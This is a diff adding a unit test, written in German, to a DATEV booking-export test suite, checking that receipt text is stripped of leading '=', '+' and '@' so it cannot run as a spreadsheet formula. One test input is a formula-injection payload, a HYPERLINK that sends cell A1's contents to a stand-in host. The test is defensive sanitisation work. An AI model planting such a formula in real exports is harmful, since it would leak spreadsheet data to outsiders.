@@ -86,6 +86,15 @@ describe("DATEV-Buchungsstapel", () => {
     expect(line.endsWith('"Café ""Zur Linde""; Bewirtung"')).toBe(true);
   });
 
+  it("Text aus dem Beleg wird in einer Tabellenkalkulation nicht zur Formel", () => {
+    expect(buchungstext('=HYPERLINK("https://x.example/?"&A1;"Klick")')).toBe(
+      'HYPERLINK("https://x.example/?"&A1;"Klick")',
+    );
+    expect(buchungstext("+1+1")).toBe("1+1");
+    expect(buchungstext("@SUM(A1)")).toBe("SUM(A1)");
+    expect(buchungstext("Papier - Ordner")).toBe("Papier - Ordner");
+  });
+
   it("Belegfeld 1 nur erlaubte Zeichen, höchstens 36", () => {
     expect(belegfeld("RE 2026/äö_15#")).toBe("RE2026/15");
     expect(belegfeld("A".repeat(40))).toHaveLength(36);
